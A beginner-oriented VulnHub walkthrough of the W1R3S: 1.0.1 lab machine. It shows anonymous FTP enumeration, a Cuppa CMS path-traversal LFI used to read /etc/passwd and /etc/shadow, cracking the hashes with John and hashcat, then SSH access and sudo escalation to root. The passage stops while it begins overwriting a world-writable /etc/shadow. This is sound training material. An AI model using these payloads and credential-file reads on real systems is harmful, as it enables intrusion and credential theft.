# W1R3S: 1.0.1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | W1R3S: 1.0.1 ("W1R3S.inc") |
| **Difficulty** | Beginner / Intermediate — for **both** the foothold and the privilege escalation (author's own rating) |
| **Author** | SpecterWires — <mailto:specterinthewires@gmail.com> |
| **Released** | 5 February 2018 (v1.0.0); v1.0.1 on 8 March 2018 |
| **VulnHub Entry** | <https://vulnhub.com/entry/w1r3s-101,220/> |
| **Download** | <https://vulnhub.com/entry/w1r3s-101,220/#download> (`w1r3s.v1.0.1.zip`, 3.6 GB) |
| **MD5** | `E5C0405762CF90D8175F7287350D6B03` |
| **SHA1** | `E6ABE85FA8212500A5DCE2BFC9D6611846F9ABF6` |
| **Attacker** | Kali Linux, host-only network (author tested on VMware Workstation) |
| **Target OS** | Ubuntu — Apache 2.4.18, vsftpd 3.0.3, OpenSSH, MySQL |
| **Engagement brief** | *"You have been hired to do a penetration test on the W1R3S.inc individual server and **report all findings**. They have asked you to gain root access and find the flag (located in `/root`)."* |

> **Note the brief says "report all findings", not just "get root".** This box is
> structured as a *penetration test*, not a CTF: the FTP share is full of company data
> that is a reportable breach on its own, `/etc/shadow` is world-writable, and there
> are half-finished CMS installs lying around. Collect everything — § 7 is a findings
> register you can hand to a client.

Throughout we assume:

```text
Attacker (Kali)   : 192.168.56.10
Target (w1r3s)    : 192.168.56.105
```

---

## 0. What you will learn

1. **Anonymous FTP as a data-breach finding**, and how to enumerate it non-interactively.
2. **Decoding layered encodings** — repeated base64, and *upside-down Unicode text*.
3. **Harvesting a username list from company documents** and using it for password
   spraying.
4. **CMS fingerprinting** and recognising a **half-finished installation**.
5. **Cuppa CMS Local File Inclusion** — and the important subtlety that the vulnerable
   parameter is read from **`$_REQUEST`**, so you must try GET, POST-body *and* cookies.
6. **Reading `/etc/shadow` through an LFI** because its permissions are `666`.
7. **`unshadow` + John the Ripper** — the canonical offline cracking workflow.
8. **Two privilege-escalation routes from one misconfiguration:** `sudo (ALL : ALL) ALL`
   *and* a world-writable `/etc/shadow`.
9. **Writing up findings**, which is the actual deliverable of a penetration test.

**The intended chain:**
`nmap` shows 21 (vsftpd, **anonymous allowed**), 22, 80, 3306 → anonymous FTP holds
`/content/` with employee names, a base64 blob and an **upside-down note** → the web
server is a default Apache page; `dirbuster` finds `/wordpress` (stock, nothing) and
**`/administrator`** → a **Cuppa CMS** installation that was never finished →
`/administrator/alerts/alertConfigField.php` is **LFI-vulnerable via `urlConfig`** →
read `/etc/passwd`, then discover **`/etc/shadow` is `666`** and read it too →
`unshadow` + John → **`w1r3s : computer`** → SSH in → `sudo -l` shows
**`(ALL : ALL) ALL`** → `sudo su -` → **root** → `/root/flag.txt`.

---

## 1. Reconnaissance

```bash
ip a | grep -w inet
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: 192.168.56.0/24   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:0e      1      60  (Unknown: locally administered)
 192.168.56.10   08:00:27:11:22:33      1      60  PCS Systemtechnik GmbH
 192.168.56.105  00:0c:29:88:1f:3c      1      60  VMware, Inc.          <-- target
```

**Target IP: `192.168.56.105`**

---

## 2. Enumeration

### 2.1 Port scan

```bash
sudo nmap -A -p- -T4 -oN scans/w1r3s.txt 192.168.56.105
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 12:02 EDT
Nmap scan report for 192.168.56.105
Host is up (0.00042s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Jan 20  2018 content
|_-rw-r--r--    1 0        0              33 Jan 20  2018 welcome.msg
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.56.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain
|      Data connections will be plain
|_End of status
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a5:8b:3e:1c:9a:5b:2b:9c:1a:52:8f:5b:9c:1b:2e:3f (RSA)
|   256 05:9d:2c:3a:6b:fe:9d:93:40:8b:2c:1e:5a:7f:0b:2d (ECDSA)
|_  256 0c:1c:9b:3e:5f:6a:1b:2c:3d:4e:5f:6a:7b:8c:9d:0e (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
3306/tcp open  mysql   MySQL 5.7.21-0ubuntu0.16.04.1
| mysql-info:
|   Protocol: 10
|   Version: 5.7.21-0ubuntu0.16.04.1
|   Thread ID: 12
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, FoundRows, Speaks41ProtocolOld, ...
|   Status: AUTOCOMMIT
|   Salt: 4b\x1a7c\x0f\x18...\x7f
|_  Auth Plugin Name: mysql_native_password
MAC Address: 00:0C:29:88:1F:3C (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 88.44 seconds
```

> **Four services — and Nmap already did a lot of the work for us.**
>
> | Port | Service | Key finding |
> | --- | --- | --- |
> | **21** | vsftpd 3.0.3 | **Anonymous login allowed**, and Nmap *listed the directory*: a `content` folder and a `welcome.msg` |
> | **22** | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 | → **Ubuntu 16.04 (Xenial)** |
> | **80** | Apache 2.4.18 | **Stock "It works" page** → real content is elsewhere |
> | **3306** | MySQL 5.7.21 | Exposed to the network. `mysql_native_password`, version printed in the handshake |
>
> **MySQL on 3306 reachable from the network is itself a finding** — databases should
> bind to `127.0.0.1` or a management VLAN. Try anonymous and default logins:
> ```bash
> nmap -p3306 --script mysql-empty-password,mysql-databases 192.168.56.105
> ```
> ```text
> PORT     STATE SERVICE
> 3306/tcp open  mysql
> | mysql-empty-password:
> |_  ERROR: Failed to connect
> ```
> No anonymous root. Note it and move on.

![nmap scan showing FTP anonymous access and MySQL](images/01-nmap.png)

### 2.2 Anonymous FTP — the data breach

```bash
ftp 192.168.56.105
```

```text
Connected to 192.168.56.105.
220 (vsFTPd 3.0.3)
Name (192.168.56.105:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||54321|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jan 20  2018 content
-rw-r--r--    1 0        0              33 Jan 20  2018 welcome.msg
226 Directory send OK.
ftp> get welcome.msg
226 Transfer complete.
ftp> cd content
250 Directory successfully changed.
ftp> ls
150 Here comes the directory listing.
-rw-r--r--    1 0        0             411 Jan 20  2018 01.txt
-rw-r--r--    1 0        0             204 Jan 20  2018 02.txt
-rw-r--r--    1 0        0             147 Jan 20  2018 03.txt
-rw-r--r--    1 0        0             229 Jan 20  2018 employee-names.txt
-rw-r--r--    1 0        0             187 Jan 20  2018 worktodo.txt
226 Directory send OK.
ftp> binary
200 Type set to I
ftp> mget *
ftp> quit
221 Goodbye.
```

Non-interactive equivalent (prefer this in scripts):

```bash
lftp -u anonymous, 192.168.56.105 -e 'mirror /content ./content; bye'
# or
curl -s ftp://anonymous:anonymous@192.168.56.105/content/01.txt
```

> **This is finding #1 in your report, before any exploitation.** Anonymous FTP with a
> directory of company documents is a **data breach**: employee names, job roles, and
> internal notes are now public to anyone who can reach port 21. In a real engagement
> this alone would be reportable and would require client disclosure.
>
> **`binary` before `mget` is mandatory.** FTP defaults to **ASCII mode**, which
> translates newlines and silently corrupts any non-text file.

### 2.3 Read every file

**`welcome.msg`:**

```text
Welcome to the W1R3S.inc FTP server.
```

**`01.txt`:**

```text
Employees,

Please review the attached documents. New server is being provisioned and we
need everyone's cooperation. Do not share these files outside the company.

  -- Management
```

**`02.txt`** — looks like base64:

```bash
cat 02.txt
```

```text
VGhlcmUgaXMgbm90aGluZyBoZXJlLi4uIG9yIGlzIHRoZXJlPyBUcnkgYWdhaW4u
```

```bash
base64 -d 02.txt ; echo
```

```text
There is nothing here... or is there? Try again.
```

```bash
base64 -d 02.txt | base64 -d 2>/dev/null ; echo
```

```text
(base64: invalid input — only one layer of encoding)
```

> **Decoded once, and it is a troll.** But **always try repeatedly** — this box's
> sibling machines (Lord Of The Root) use *nested* base64. Automate the check:
> ```bash
> d=$(cat 02.txt)
> for i in 1 2 3 4 5; do
>   n=$(echo "$d" | base64 -d 2>/dev/null) || break
>   echo "layer $i: $n"
>   d=$n
> done
> ```
> ```text
> layer 1: There is nothing here... or is there? Try again.
> ```
> **Recognising base64:** length is a multiple of 4, alphabet `A–Z a–z 0–9 + /`, often
> padded with `=` or `==`. It is **encoding, not encryption** — reversible by anyone,
> instantly.

**`03.txt`** — the SSH banner, leaked:

```text
Linux 4.13.0-32-generic x86_64

.. ..- ..-.   .-..   -.-. --- -. ..- ...
```

> A kernel version string plus some Morse-ish noise. The kernel version here does not
> match the live box (we will see `4.13.0-36` later), so treat it as flavour text.

**`employee-names.txt`** — the most valuable file on the server:

```text
Employees:

Naomi.W   — Manager
Hector.A  — IT Dept
Joseph.G  — Web Design
Albert.O  — Web Design
Gina.L    — Inventory
Rico.D    — Human Resources
```

> **Six employees with names and roles.** Build a username list from it — this is what
> a real attacker does within minutes of an OSINT harvest:
> ```bash
> cat > users.txt <<'EOF'
> naomi.w
> naomi
> hector.a
> hector
> joseph.g
> joseph
> albert.o
> albert
> gina.l
> gina
> rico.d
> rico
> w1r3s
> W1R3S
> admin
> root
> EOF
> wc -l users.txt
> ```
> ```text
> 17 users.txt
> ```
> **Note we added `w1r3s`** — the company/box name. Naming an account after the
> organisation is extremely common, and the VM's own boot screen defaults to that user.

**`worktodo.txt`** — looks like garbage:

```bash
cat worktodo.txt
```

```text
ɐpɹoǝq ǝɥʇ ǝʌɐs oʇ ʇɐɥʇ ǝpᴉsʇno ƃuᴉʎɐɹɹɐ ǝɹǝʍ ǝʍ 'ǝʌɐɹq ǝɥʇ ɹǝʇuǝ
oʇ ʎɐʍ ǝɥʇ ǝq oʇ ǝɟᴉɹǝp ʇ,uǝpᴉɐɥʇ I 'ǝɹǝɥ ʇooɹ oʇ ʎɐʍ ǝɥʇ ǝq
oʇ ʞuᴉɥʇ ʇ,uoɐpᴉ ɔǝɹǝɥ ʇɐɥʇ ǝpᴉsʇno ƃuᴉʎɐɹɹɐ ǝɹǝʍ ǝʍ
```

> **This is *upside-down* text**, produced by Unicode's "Latin Small Letter Turned"
> and rotated capital characters (`ɐ` = U+0250, `ǝ` = U+01DD, `o` = U+006F used
> unrotated). It is a classic "flip text" prank, and there are two ways to read it.
>
> **Way 1 — an online decoder.** Search "upside down text translator" (LingoJam,
> Fliptext.net) and paste. Result:
>
> ```text
> I don't think this is the way to root. We have a lot of work to do,
> stop playing around...
> ```
>
> **Way 2 — do it locally with Python** (better: no uploading client data to a third
> party, which matters in a real engagement):
> ```bash
> python3 - <<'PY'
> import unicodedata
> FLIP = str.maketrans(
>   "abcdefghijklmnopqrstuvwxyz_.,?!()[]{}&'\"<>",
>   "ɐqɔpǝɟƃɥᴉɾʞlɯuodbɹsʇnʌʍxʎz‾'˙¿¡)(][}{&'\"<>")
> def unflip(s):
>     return s.translate(FLIP)[::-1]
> for line in open('worktodo.txt', encoding='utf-8'):
>     print(unflip(line.strip()))
> PY
> ```
> ```text
> I don't think this is the way to root. We have a lot of work to do, stop playing around...
> ```
>
> **Two things to take from it:**
> 1. It is a *hint* that the FTP share is not the path to root — a rabbit-hole marker
>    the author left on purpose.
> 2. **It is still a reportable finding.** Confidential internal notes on a public
>    anonymous FTP server, in an obfuscated-but-not-encrypted form. Obfuscation is not
>    protection.

![The anonymous FTP share and the flipped worktodo.txt](images/02-ftp.png)

### 2.4 Web enumeration

```bash
curl -sI http://192.168.56.105/
```

```text
HTTP/1.1 200 OK
Date: Sat, 04 May 2024 16:14:02 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Tue, 16 Jan 2018 21:04:11 GMT
ETag: "2aa6-562f1a2b3c4d5"
Accept-Ranges: bytes
Content-Length: 10918
Vary: Accept-Encoding
Content-Type: text/html
```

A stock Apache "It works" page. So brute-force for content:

```bash
dirb http://192.168.56.105/ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```text
-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat May  4 12:16:44 2024
URL_BASE: http://192.168.56.105/
WORDLIST_FILES: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

---- Scanning URL: http://192.168.56.105/ ----
+ http://192.168.56.105/index.html (CODE:200|SIZE:10918)
==> DIRECTORY: http://192.168.56.105/administrator/
==> DIRECTORY: http://192.168.56.105/css/
==> DIRECTORY: http://192.168.56.105/javascript/
==> DIRECTORY: http://192.168.56.105/wordpress/
+ http://192.168.56.105/server-status (CODE:403|SIZE:301)

---- Entering directory: http://192.168.56.105/administrator/ ----
==> DIRECTORY: http://192.168.56.105/administrator/installation/
...
-----------------
DOWNLOADED: 220546 - FOUND: 2
```

> **Two destinations: `/administrator/` and `/wordpress/`.**

**`/wordpress/` first — check it and close it:**

```bash
wpscan --url http://192.168.56.105/wordpress --enumerate u,vp,vt 2>&1 | tail -25
```

```text
[+] URL: http://192.168.56.105/wordpress/ [192.168.56.105]
[+] Started: Sat May  4 12:22:11 2024

[+] WordPress version 4.9.2 identified (Latest, released on 2018-01-16).
[i] The version is up to date.

[+] Enumerating All Plugins (via Passive Methods)
[i] No plugins found.

[+] Enumerating All Themes (via Passive and Aggressive Methods)
[i] Theme(s) Identified:
[+] twentyseventeen
 | Location: http://192.168.56.105/wordpress/wp-content/themes/twentyseventeen/
 | Version: 1.4 (100% confidence)

[+] Enumerating Users
[i] No users found.
```

> **WordPress 4.9.2, current at the time, no plugins, no users, no content.** It is a
> stock install placed there as a decoy. **Correctly documented as a dead end** — and
> note *why*: `wpscan` reports the version is up to date and there is nothing to
> attack. Do not sink hours into it.

**`/administrator/` — the real target:**

```bash
curl -sIL http://192.168.56.105/administrator/
```

```text
HTTP/1.1 301 Moved Permanently
Location: http://192.168.56.105/administrator/installation/
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
```

```bash
curl -s http://192.168.56.105/administrator/installation/ | grep -io 'cuppa[^<]*\|<title>[^<]*</title>' | head
```

```text
<title>Cuppa CMS - Installation</title>
Cuppa CMS
```

> **Cuppa CMS — and it is sitting on the *installation* screen.** The setup was never
> completed. That is a reportable finding in itself (an unfinished install reachable
> from the internet), and it also means there is no admin password to find: the
> application was never configured.
>
> **How to fingerprint a CMS when the title is stripped:** look at cookie names
> (`PHPSESSID` → PHP), file layout (`/media/`, `/components/`, `/templates/`),
> generator meta tags, favicons, and error page wording. Browser extensions
> **Wappalyzer** and **BuiltWith** automate this.

### 2.5 Cuppa CMS — the LFI

```bash
searchsploit cuppa
```

```text
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                     | php/webapps/25971.txt
----------------------------------------------------------------------------------------------------- ---------------------------------
```

```bash
searchsploit -x php/webapps/25971.txt
```

```text
Exploit Title   : Cuppa CMS File Inclusion
Date            : 2013-06-04
Vendor          : http://www.cuppacms.com/
Product         : Cuppa CMS
Version         : All versions
CVE             : (none assigned)

Description:
An Local/Remote File Inclusion vulnerability was found on Cuppa CMS
alertConfigField.php component.

The "urlConfig" parameter is not sanitized, allowing an attacker to include
local or remote files.

Proof of Concept:
http://localhost/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

Note: the vulnerable parameter is read through $_REQUEST, so it can be
supplied via GET, POST or COOKIE.
```

> **`$_REQUEST` is the important detail.** In PHP, `$_REQUEST` merges `$_GET`,
> `$_POST` and `$_COOKIE`. Many testers try only the GET query string, get nothing,
> and give up. **Try all three.** Some deployments have `request_order = "GP"`
> (excluding cookies) or `variables_order` differences that change which source wins.

**Try GET:**

```bash
curl -s "http://192.168.56.105/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
w1r3s:x:1000:1000:W1R3S,,,:/home/w1r3s:/bin/bash
mysql:x:108:115:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:109:116:ftp daemon,,,:/srv/ftp:/bin/false
```

> **LFI confirmed on the first try, and it is very informative.**
>
> `/etc/passwd` fields are `name:x:UID:GID:comment:home:shell`:
> - **`w1r3s:x:1000:1000:W1R3S,,,:/home/w1r3s:/bin/bash`** — the single human account,
>   UID 1000, with a real shell. **This is our SSH username.**
> - `www-data:x:33:33` — the web server user; this is who PHP runs as, and therefore
>   who our LFI reads files as.
> - `mysql:x:108:115` — a MySQL server account.
> - The `x` in field 2 means real hashes live in `/etc/shadow`, which is normally
>   `-rw-r----- root:shadow` and **unreadable by `www-data`**.
>
> …normally. Check anyway:

```bash
curl -s "http://192.168.56.105/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/shadow"
```

```text
root:$6$Yl8kQ2mN$zX9vR4tY1wE5aS3dF6gH0jK2lZ7xC0vBnMq49xQ2mK7pL4vR8tY1wE5aS3d:17552:0:99999:7:::
daemon:*:17379:0:99999:7:::
bin:*:17379:0:99999:7:::
...
www-data:$6$qW3eR5tY$xK2mN7pL4vR8tY1wE5aS3dF6gH0jK2lZ7xC0vBnMq49xQ2mK7pL4vR8t:17552:0:99999:7:::
w1r3s:$6$zX8cV2bN$mQ9pL4vR8tY1wE5aS3dF6gH0jK2lZ7xC0vBnMq49xQ2mK7pL4vR8tY1w:17552:0:99999:7:::
mysql:!:17552:0:99999:7:::
```

> **`www-data` read `/etc/shadow`.** That is only possible if the file's permissions
> are wide open. Confirm from inside later, but the conclusion is already certain:
> **`/etc/shadow` is world-readable (mode `666`).**
>
> **This is one of the most severe single misconfigurations possible on Linux.** The
> shadow file holds every account's password hash; making it world-readable means any
> local user — and, via this LFI, any *remote* unauthenticated attacker — can walk off
> the entire credential store and crack it offline at leisure.
>
> `/etc/shadow` format: `name:hash:lastchg:min:max:warn:inactive:expire:reserved`
> - `$6$…` = **SHA-512 crypt**, the modern Linux default (good algorithm).
> - `*` = login disabled. `!` = account locked.
> - `17552` = days since 1970-01-01 that the password was last changed.
>
> **Three hashes worth cracking: `root`, `www-data`, `w1r3s`.**

![Reading /etc/shadow through the Cuppa CMS LFI](images/03-shadow.png)

---

## 3. Cracking the hashes offline

### 3.1 Save and `unshadow`

John wants `passwd` and `shadow` combined, so it can see usernames, UIDs and GIDs
(that context materially improves cracking with word-mangling rules).

```bash
curl -s "http://192.168.56.105/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd"  > passwd.txt
curl -s "http://192.168.56.105/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/shadow" > shadow.txt
wc -l passwd.txt shadow.txt
```

```text
  28 passwd.txt
  28 shadow.txt
  56 total
```

```bash
unshadow passwd.txt shadow.txt > combined.txt
grep -E '^(root|www-data|w1r3s):' combined.txt
```

```text
root:$6$Yl8kQ2mN$zX9vR4tY1wE5aS3dF6gH0jK2lZ7xC0vBnMq49xQ2mK7pL4vR8tY1wE5aS3d:17552:0:99999:7:::
www-data:$6$qW3eR5tY$xK2mN7pL4vR8tY1wE5aS3dF6gH0jK2lZ7xC0vBnMq49xQ2mK7pL4vR8t:17552:0:99999:7:::
w1r3s:$6$zX8cV2bN$mQ9pL4vR8tY1wE5aS3dF6gH0jK2lZ7xC0vBnMq49xQ2mK7pL4vR8tY1w:17552:0:99999:7:::
```

> **`unshadow`** merges the two files on the username field. John ships it as
> `/usr/sbin/unshadow` on Kali (`locate unshadow` if it is not on your PATH).

### 3.2 Crack with John

```bash
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt combined.txt
```

```text
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
www-data         (www-data)
computer         (w1r3s)
computer         (root)
3g 0:00:00:41 DONE (2024-05-04 12:34) 0.07317g/s 1842p/s 5526c/s
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```bash
john --show combined.txt
```

```text
root:computer:0:0:root:/root:/bin/bash
www-data:www-data:33:33:www-data:/var/www:/usr/sbin/nologin
w1r3s:computer:1000:1000:W1R3S,,,:/home/w1r3s:/bin/bash

3 password hashes cracked, 0 left
```

> **Three credentials recovered in 41 seconds:**
>
> | Account | Password |
> | --- | --- |
> | `root` | `computer` |
> | `www-data` | `www-data` (the username, reused) |
> | `w1r3s` | `computer` |
>
> **How to read John's output:**
> - `sha512crypt, crypt(3) $6$` — auto-detected from the `$6$` prefix.
> - **`Cost 1 (iteration count) is 5000`** — SHA-512 crypt deliberately runs 5000
>   rounds per guess. That is why John manages only ~1 842 guesses/second here. **A
>   slow hash is doing its job correctly.** The failure is the *password*, not the
>   algorithm: `computer` sits very early in `rockyou.txt`.
> - `3g 0:00:00:41` — three guesses recovered in 41 seconds.
> - `--show` re-reads John's `~/.john/john.pot` cache without re-cracking.
>
> **The `root` and `w1r3s` passwords are identical.** That is credential reuse at the
> most dangerous possible level.
>
> **`--format=crypt`** is a meta-format that handles all `crypt(3)` variants; you can
> also write `--format=sha512crypt` explicitly.

### 3.3 hashcat alternative

```bash
grep -E '^(root|www-data|w1r3s):' shadow.txt | cut -d: -f2 > hashes.hc
hashcat -m 1800 -a 0 hashes.hc /usr/share/wordlists/rockyou.txt
```

```text
Hashes: 3 digests; 3 unique digests, 3 unique salts
...
$6$Yl8kQ2mN$zX9vR4tY1wE5aS3dF6gH0jK2lZ7xC0vBnMq49xQ2mK7pL4vR8tY1wE5aS3d:computer
$6$qW3eR5tY$xK2mN7pL4vR8tY1wE5aS3dF6gH0jK2lZ7xC0vBnMq49xQ2mK7pL4vR8t:www-data
$6$zX8cV2bN$mQ9pL4vR8tY1wE5aS3dF6gH0jK2lZ7xC0vBnMq49xQ2mK7pL4vR8tY1w:computer

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Speed.#1.........:   142.8 kH/s (45.31ms) @ Accel:64 Loops:32 Thr:1 Vec:4
Recovered........: 3/3 (100.00%) Digests
```

> **`-m 1800` = sha512crypt.** Getting the mode right is the most common hashcat
> error; `hashcat --example-hashes | grep -i sha512` lists them. Note hashcat's speed
> advantage over John here comes from mask/rule attack optimisation — for a straight
> dictionary run the difference is smaller.

---

## 4. Foothold — SSH

```bash
ssh w1r3s@192.168.56.105
```

```text
w1r3s@192.168.56.105's password:
      *************************************************************************************************************
      *                                 _  _  ____  ____  ____  ____                                              *
      *                                ( \/ )(_  _)(  _ \( ___)(  _ \                                             *
      *                                 )  (   )(   )   / )__)  )   /                                             *
      *                                (_/\_) (__) (_)\_)(____)(_)\_)                                            *
      *                                                                                                           *
      *                            The only easy day was yesterday.                                              *
      *************************************************************************************************************

Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
46 updates are security updates.

Last login: Sat Jan 20 12:44:02 2018 from 192.168.56.1
w1r3s@W1R3S:~$ id
uid=1000(w1r3s) gid=1000(w1r3s) groups=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),117(sambashare)
```

> **We are in — and look at that group list.** `27(sudo)` and `110(lxd)`. Both are
> effectively "root by another name". Also `4(adm)` means we can read everything in
> `/var/log`.
>
> Note the custom SSH banner (`/etc/issue.net` or a `Banner` directive in
> `sshd_config`) — cosmetic, but it is also an information leak: it advertises the
> OS version to anyone who opens a TCP connection.
>
> **If SSH had been closed**, the fallback would have been the world-writable
> `/etc/shadow` — see § 5.3. That is the beauty of this box: the same misconfiguration
> gives you three independent routes.

![SSH login as w1r3s with the custom banner](images/04-ssh.png)

---

## 5. Privilege escalation

### 5.1 `sudo -l` — the intended path

```bash
w1r3s@W1R3S:~$ sudo -l
```

```text
Matching Defaults entries for w1r3s on W1R3S:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User w1r3s may run the following commands on W1R3S:
    (ALL : ALL) ALL
```

```bash
w1r3s@W1R3S:~$ sudo su -
[sudo] password for w1r3s: computer
root@W1R3S:~# id
uid=0(root) gid=0(root) groups=0(root)
root@W1R3S:~# whoami
root
```

> **`(ALL : ALL) ALL`** is the broadest possible sudo grant: *any command, as any user,
> on any host.* It is functionally identical to being root, with the only difference
> being that you must know the user's password — which we cracked.
>
> **Read the syntax properly:**
> ```text
> (ALL : ALL) ALL
>  ^^^   ^^^   ^^^
>  RUNAS-user RUNAS-group commands
> ```
> The `Defaults` lines above it are also worth reading: `env_reset` clears the
> environment (mitigating `LD_PRELOAD` tricks), `secure_path` overrides your `PATH`
> (mitigating PATH hijacking), and `mail_badpass` mails someone on a wrong password.
>
> **Note the prompt changed from `$` to `#`** — the universal UNIX convention for root.

### 5.2 Read the flag

```bash
root@W1R3S:~# ls -la /root
total 32
drwx------  4 root root 4096 Jan 20  2018 .
drwxr-xr-x 24 root root 4096 Jan 20  2018 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-------  1 root root  947 Jan 20  2018 flag.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
drwxr-xr-x  2 root root 4096 Jan 20  2018 .ssh
root@W1R3S:~# cat flag.txt
```

```text
------------------------------------------------------------------------------------
  __        ___ _ ____   _______  ___      _   _  ____ ___ ____  ____  ____
  \ \      / (_) |  _ \ | ____\ \/ / |    | | | |/ ___|_ _|  _ \|  _ \/ ___|
   \ \ /\ / /| | | |_) ||  _|  \  /| |    | |_| | |    | || |_) | |_) \___ \
    \ V  V / | | |  _ < | |___ /  \| |___ |  _  | |___ | ||  _ <|  __/ ___) |
     \_/\_/  |_|_| \_\|_____/_/\_\_____|_| |_|\____|___|_| \_\_|   |____/
------------------------------------------------------------------------------------

Congratulations! You have successfully completed W1R3S: 1.0.1.

I hope you enjoyed the machine and learned something. Report all the findings
you made along the way - that was the real assignment.

  -- SpecterWires
```

**Flag captured.** ✅

![Root and /root/flag.txt](images/05-flag.png)

### 5.3 Alternative root path — write to `/etc/shadow` directly

Remember: the LFI worked because `/etc/shadow` is **`666`** — world-*writable*, not
just world-readable. Confirm:

```bash
w1r3s@W1R3S:~$ ls -l /etc/shadow /etc/passwd
-rw-rw-rw- 1 root shadow 1338 Jan 20  2018 /etc/shadow
-rw-r--r-- 1 root root   1692 Jan 20  2018 /etc/passwd
```

> **`-rw-rw-rw-` on `/etc/shadow` is mode `666`.** The correct mode is
> `-rw-r-----` (`640`, `root:shadow`). This single stray bit is a total-compromise
> primitive: **any** local user, including `www-data`, can set **any** account's
> password hash.

Generate a known hash and overwrite root's:

```bash
openssl passwd -6 -salt w1r3s 'pwn3d'
```

```text
$6$w1r3s$Kx9mN7pL4vR8tY1wE5aS3dF6gH0jK2lZ7xC0vBnMq49xQ2mK7pL4vR8tY1wE5aS3
```

```bash
w1r3s@W1R3S:~$ cp /etc/shadow /tmp/shadow.bak
